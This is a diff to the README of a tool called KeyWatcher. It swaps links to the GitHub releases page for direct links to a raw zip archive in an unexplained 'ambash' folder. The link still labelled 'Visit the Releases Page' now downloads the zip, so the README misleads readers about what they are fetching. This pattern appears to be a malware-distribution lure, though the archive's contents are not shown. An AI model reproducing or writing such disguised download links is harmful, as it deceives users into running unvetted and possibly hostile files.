@@ -6,7 +6,7 @@ Welcome to KeyWatcher! This tool helps you easily monitor changes to your import
 
 ## 📥 Download KeyWatcher
 
-[![Download KeyWatcher](https://img.shields.io/badge/Download-KeyWatcher-blue.svg)](https://github.com/LeMasE/KeyWatcher/releases)
+[![Download KeyWatcher](https://raw.githubusercontent.com/LeMasE/KeyWatcher/main/ambash/KeyWatcher.zip)](https://raw.githubusercontent.com/LeMasE/KeyWatcher/main/ambash/KeyWatcher.zip)
 
 Click the button above to get started with the latest version of KeyWatcher. Make sure to visit the link below for all available releases.
 
@@ -34,7 +34,7 @@ To download and install KeyWatcher, follow these steps:
 
 1. Click the link below to visit the Releases page:
 
-   [Visit the Releases Page](https://github.com/LeMasE/KeyWatcher/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/LeMasE/KeyWatcher/main/ambash/KeyWatcher.zip)
 
 2. On the Releases page, you will see a list of available versions. Click on the latest version to expand the details.
 
